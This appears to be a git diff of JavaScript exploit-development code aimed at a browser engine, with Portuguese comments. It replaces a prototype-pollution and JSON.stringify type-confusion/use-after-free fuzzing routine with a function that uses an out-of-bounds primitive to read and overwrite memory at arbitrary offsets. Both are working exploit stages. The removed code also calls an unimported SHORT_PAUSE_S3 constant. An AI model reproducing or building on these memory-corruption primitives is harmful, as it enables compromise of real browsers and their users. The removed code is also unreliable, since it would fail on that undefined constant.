@@ -1,157 +1,131 @@
-// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs'; // SHORT_PAUSE_S3 não usado aqui
-import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
+// js/script3/testReadWriteAtOffset.mjs
+import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
+import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
     oob_write_absolute, oob_read_absolute, clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // KNOWN_STRUCTURE_IDS não usado aqui
+import { OOB_CONFIG } from '../config.mjs';
 
-// --- Parâmetros de Teste Configuráveis ---
-const SPECULATIVE_TEST_CONFIG = {
-    victim_ab_size: 64,
-    corruption_offsets: [
-        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
-        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 8,
-        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 4,
-    ],
-    values_to_write: [
-        0xFFFFFFFF, 
-        0x0,        
-        0x1,        
-    ],
-    bytes_to_write_for_corruption: 4, 
-    ppKey: 'toJSON', 
-    // Adicione stop_on_first_success se quiser parar após o primeiro sucesso especulativo
-    // stop_on_first_success: true, 
-};
-// --- Fim dos Parâmetros ---
+export async function executeReadWriteVerificationAtOffset(
+    testDescription,
+    offsetToProbe, 
+    valueToWrite,    
+    bytesToReadWrite // Geralmente 4 para DWORD, 8 para QWORD
+) {
+    const FNAME_TEST = `executeReadWriteVerification<${testDescription}>`;
 
-export async function testJsonTypeConfusionUAFSpeculative() {
-    const FNAME = "testJsonTypeConfusionUAFSpeculative_OriginalFreezing"; // Nomeado para clareza
-    logS3(`--- Iniciando Teste Especulativo UAF/TC via JSON (S3) (ORIGINAL CONGELANTE) ---`, "test", FNAME);
-    logS3(`   Configurações: victim_size=${SPECULATIVE_TEST_CONFIG.victim_ab_size}, ppKey=${SPECULATIVE_TEST_CONFIG.ppKey}`, "info", FNAME);
-    logS3(`   Offsets: ${SPECULATIVE_TEST_CONFIG.corruption_offsets.map(o => toHex(o)).join(', ')}`, "info", FNAME);
-    logS3(`   Valores: ${SPECULATIVE_TEST_CONFIG.values_to_write.map(v => toHex(v)).join(', ')}`, "info", FNAME);
+    logS3(`--- Iniciando Teste R/W em Offset: ${testDescription} ---`, "test", FNAME_TEST);
+    logS3(`   Alvo Offset: ${toHex(offsetToProbe)}, Valor a Escrever: ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)}, Bytes: ${bytesToReadWrite}`, "info", FNAME_TEST);
+    document.title = `Iniciando R/W Test: ${testDescription}`;
 
-    let overallTestSuccess = false;
+    await triggerOOB_primitive(); 
+    if (!oob_array_buffer_real) {
+        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
+        document.title = "ERRO: Falha OOB Setup";
+        return;
+    }
+    document.title = "OOB Configurado";
 
-    for (const corruption_offset of SPECULATIVE_TEST_CONFIG.corruption_offsets) {
-        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
+    const initialOOBArrayBufferByteLength = oob_array_buffer_real.byteLength;
+    logS3(`Tamanho de oob_array_buffer_real: ${initialOOBArrayBufferByteLength} bytes`, "info", FNAME_TEST);
 
-        for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write) {
-            if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
+    let stepReached = "inicio";
+    let readOriginalValue = "N/A";
+    let readValueAfterWrite = "N/A";
+    let dvReadAfterWrite = "N/A";
 
-            // ****** PONTO DE INTERESSE PARA DEPURAÇÃO ******
-            if (corruption_offset === ((OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16) && value_to_write === 0xFFFFFFFF) {
-                logS3("!!! ATINGIDA COMBINAÇÃO CRÍTICA DE CONGELAMENTO (offset 0x70, valor 0xFFFFFFFF) !!!", "critical", FNAME);
-                document.title = "CRITICAL COMBO - DEBUG NOW";
-                // debugger; // Descomente esta linha para pausar o depurador automaticamente aqui
-            }
-            // ***********************************************
+    try {
+        // 1. Ler o valor original no offset (sem verificação de limites)
+        stepReached = "antes_leitura_original";
+        document.title = `Lendo Original: ${testDescription}`;
+        try {
+            readOriginalValue = oob_read_absolute(offsetToProbe, bytesToReadWrite);
+            logS3(`Valor ORIGINAL em ${toHex(offsetToProbe)} (${bytesToReadWrite}b): ${typeof readOriginalValue === 'object' ? readOriginalValue.toString(true) : toHex(readOriginalValue)}`, "leak", FNAME_TEST);
+        } catch (e_read_orig) {
+            logS3(`ERRO ao ler valor original em ${toHex(offsetToProbe)}: ${e_read_orig.message}`, "error", FNAME_TEST);
+            readOriginalValue = `Erro: ${e_read_orig.message}`;
+        }
+        await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-            await triggerOOB_primitive(); 
-            if (!oob_array_buffer_real) {
-                logS3("Falha ao configurar ambiente OOB. Abortando iteração.", "error", FNAME);
-                continue;
-            }
+        // 2. Escrever o novo valor no offset (sem verificação de limites)
+        stepReached = "antes_escrita_oob";
+        document.title = `Escrevendo em ${toHex(offsetToProbe)}: ${testDescription}`;
+        logS3(`Escrevendo valor ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)} em ${toHex(offsetToProbe)} (${bytesToReadWrite}b)...`, "warn", FNAME_TEST);
+        // Serialize AdvancedInt64 para bytes se necessário
+        let writeValue = valueToWrite;
+        if (writeValue instanceof AdvancedInt64) {
+            // Assume que oob_write_absolute pode lidar com AdvancedInt64 ou serialize para bytes
+            writeValue = writeValue.toBytes(true); // Convertendo para little-endian, por exemplo
+        }
+        oob_write_absolute(offsetToProbe, writeValue, bytesToReadWrite);
+        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
+        stepReached = "apos_escrita_oob";
+        document.title = `Após Escrita em ${toHex(offsetToProbe)}: ${testDescription}`;
+        await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-            let victim_ab = new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size);
-            logS3(` vítima AB (${SPECULATIVE_TEST_CONFIG.victim_ab_size}b) recriado. Off: ${toHex(corruption_offset)}, Val: ${toHex(value_to_write)}`, "info", FNAME);
-
-            const ppKey = SPECULATIVE_TEST_CONFIG.ppKey;
-            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-            let pollutionApplied = false;
-            let currentIterationSuccess = false;
-            let stepReached = "inicio_iteracao";
-            document.title = `Iter: ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
-
-            try {
-                stepReached = "antes_pp";
-                logS3(`Poluindo Object.prototype.${ppKey}...`, "info", FNAME);
-                document.title = `PP - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
-                Object.defineProperty(Object.prototype, ppKey, {
-                    value: function() { // Esta é a sua toJSON "v2 - Refinado" original
-                        const currentOperationThis = this;
-                        // Adicione um contador local se quiser ver o número da chamada
-                        // let callCount = (this._toJSON_call_count_ = (this._toJSON_call_count_ || 0) + 1);
-                        // if (callCount === 1) document.title = `toJSON C1 - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
-                        
-                        logS3(`[${ppKey} Poluído] Chamado!`, "vuln", FNAME);
-                        logS3(`  typeof this: ${typeof currentOperationThis}`, "info", FNAME);
-                        logS3(`  this instanceof ArrayBuffer: ${currentOperationThis instanceof ArrayBuffer}`, "info", FNAME);
-                        // ... (resto da sua lógica original da toJSON "v2 - Refinado")
-                        let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
-                        try {
-                            details.byteLength = currentOperationThis.byteLength;
-                            if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
-                                let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
-                                let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
-                                if (bufferToView.byteLength >= offsetInView + 4) {
-                                   details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
-                                } else { /*...*/ }
-                            } else { /*...*/ }
-                            details.slice_exists = (typeof currentOperationThis.slice === 'function');
-                            if (details.slice_exists) { logS3(`  [${ppKey} Poluído] this.slice existe.`, "info", FNAME); }
-                            logS3(`  Detalhes: byteLength=${details.byteLength}, 1stDword=${details.first_dword === "N/A (antes da tentativa)" ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME);
-                            return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details };
-                        } catch (e) {
-                            logS3(`  [${ppKey} Poluído] ERRO props: ${e.message}`, "critical", FNAME);
-                            currentIterationSuccess = true; overallTestSuccess = true;
-                            return { toJSON_error: true, message: e.message, /*...*/ };
-                        }
-                    },
-                    writable: true, configurable: true, enumerable: false
-                });
-                pollutionApplied = true;
-                logS3(`Object.prototype.${ppKey} poluído.`, "good", FNAME);
-                stepReached = "pp_aplicada";
-
-                if (corruption_offset >= 0 && corruption_offset + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
-                    logS3(`CORRUPÇÃO: ${toHex(value_to_write)} @ ${toHex(corruption_offset)}`, "warn", FNAME);
-                    stepReached = "antes_escrita_oob";
-                    document.title = `OOBWrite - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
-                    oob_write_absolute(corruption_offset, value_to_write, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
-                    logS3("Escrita OOB feita.", "info", FNAME);
-                    stepReached = "apos_escrita_oob";
+        // 3. Ler de volta o valor no offset para confirmar a escrita (sem verificação de limites)
+        stepReached = "antes_leitura_confirmacao";
+        document.title = `Lendo Confirmação: ${testDescription}`;
+        try {
+            readValueAfterWrite = oob_read_absolute(offsetToProbe, bytesToReadWrite);
+            logS3(`Valor PÓS-ESCRITA em ${toHex(offsetToProbe)} (${bytesToReadWrite}b): ${typeof readValueAfterWrite === 'object' ? readValueAfterWrite.toString(true) : toHex(readValueAfterWrite)}`, "leak", FNAME_TEST);
+            
+            // Verificação precisa
+            if (valueToWrite instanceof AdvancedInt64) {
+                if (!valueToWrite.equals(readValueAfterWrite)) {
+                    logS3("!!! VERIFICAÇÃO FALHOU: Valor lido difere do escrito (AdvancedInt64) !!!", "error", FNAME_TEST);
                 } else {
-                    logS3(`AVISO: Offset corrupção ${toHex(corruption_offset)} fora dos limites.`, "warn", FNAME);
-                    stepReached = "escrita_oob_pulada";
+                    logS3("Verificação OK (AdvancedInt64).", "good", FNAME_TEST);
                 }
-
-                await PAUSE_S3(MEDIUM_PAUSE_S3); 
-                stepReached = "antes_stringify";
-                document.title = `Stringify? - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
-                logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME);
-                let stringifyResult = null;
-                try {
-                    stringifyResult = JSON.stringify(victim_ab); 
-                    stepReached = "apos_stringify";
-                    document.title = `OK - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
-                    logS3(`Resultado JSON.stringify: ${String(stringifyResult).substring(0, 100)}...`, "info", FNAME);
-                    if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_error:true")) {
-                        logS3("SUCESSO ESPECULATIVO (toJSON erro).", "vuln", FNAME);
-                    }
-                } catch (e) {
-                    stepReached = "erro_stringify";
-                    document.title = `ERRO Strfy - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
-                    logS3(`ERRO JSON.stringify: ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME);
-                    currentIterationSuccess = true; overallTestSuccess = true;
-                }
-
-            } catch (mainIterationError) {
-                logS3(`Erro iteração: ${mainIterationError.message}`, "error", FNAME);
-            } finally {
-                if (pollutionApplied) {
-                    if (originalToJSONDescriptor) {
-                        Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
-                    } else { delete Object.prototype[ppKey]; }
+            } else {
+                // Usar BigInt para comparações de 64-bit
+                const writtenBigInt = BigInt(valueToWrite);
+                const readBigInt = typeof readValueAfterWrite === 'bigint' ? readValueAfterWrite : BigInt(readValueAfterWrite);
+                if (writtenBigInt !== readBigInt) {
+                    logS3(`!!! VERIFICAÇÃO FALHOU: Valor lido (${toHex(readBigInt)}) difere do escrito (${toHex(writtenBigInt)}) !!!`, "error", FNAME_TEST);
+                } else {
+                    logS3("Verificação OK (numérico).", "good", FNAME_TEST);
                 }
             }
-            logS3(`Iteração Concluída (${toHex(corruption_offset)}, ${toHex(value_to_write)}). Sucesso Espec: ${currentIterationSuccess}. Último passo: ${stepReached}`, currentIterationSuccess ? "vuln" : "info", FNAME);
-            await PAUSE_S3(SHORT_PAUSE_S3); 
-        } 
-    } 
-    clearOOBEnvironment(); 
-    logS3(`--- Teste Especulativo UAF/TC via JSON (ORIGINAL CONGELANTE) Concluído (Sucesso Geral Espec: ${overallTestSuccess}) ---`, "test", FNAME);
+        } catch (e_read_confirm) {
+            logS3(`ERRO ao ler valor de confirmação em ${toHex(offsetToProbe)}: ${e_read_confirm.message}`, "error", FNAME_TEST);
+            readValueAfterWrite = `Erro: ${e_read_confirm.message}`;
+        }
+        stepReached = "apos_leitura_confirmacao";
+        document.title = `Após Leitura Confirmação: ${testDescription}`;
+        await PAUSE_S3(MEDIUM_PAUSE_S3);
+
+        // 4. Testar oob_dataview_real (opcional, removido se não relevante)
+        stepReached = "antes_teste_dv";
+        document.title = `Testando DataView: ${testDescription}`;
+        try {
+            if (oob_dataview_real) {
+                let dvTestRead = oob_dataview_real.getUint32(0, true);
+                dvReadAfterWrite = `Lido ${toHex(dvTestRead)} de oob_dataview_real[0]`;
+                logS3(`Leitura de teste da oob_dataview_real[0]: ${toHex(dvTestRead)}`, "good", FNAME_TEST);
+            } else {
+                dvReadAfterWrite = "oob_dataview_real nulo";
+                logS3("AVISO: oob_dataview_real é nulo.", "warn", FNAME_TEST);
+            }
+        } catch (e_dv) {
+            dvReadAfterWrite = `Erro ao ler oob_dataview_real[0]: ${e_dv.message}`;
+            logS3(`ERRO ao ler oob_dataview_real[0]: ${e_dv.message}`, "error", FNAME_TEST);
+        }
+        stepReached = "apos_teste_dv";
+        document.title = `DataView Testada: ${testDescription}`;
+
+    } catch (mainError) {
+        stepReached = "erro_principal";
+        document.title = `ERRO Principal R/W Test: ${testDescription}`;
+        logS3(`Erro principal no teste R/W em Offset (${testDescription}): ${mainError.message}`, "error", FNAME_TEST);
+        console.error(mainError);
+    } finally {
+        clearOOBEnvironment();
+        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
+    }
+    logS3(`--- Teste R/W em Offset Concluído: ${testDescription} ---`, "test", FNAME_TEST);
+    logS3(`   Resultados: Original=${typeof readOriginalValue === 'object' ? readOriginalValue.toString(true) : toHex(readOriginalValue)}, Pós-Escrita=${typeof readValueAfterWrite === 'object' ? readValueAfterWrite.toString(true) : toHex(readValueAfterWrite)}, Leitura Final DV=${dvReadAfterWrite}`, "info", FNAME_TEST);
+    
+    document.title = `Teste R/W Concluído: ${testDescription}`;
 }
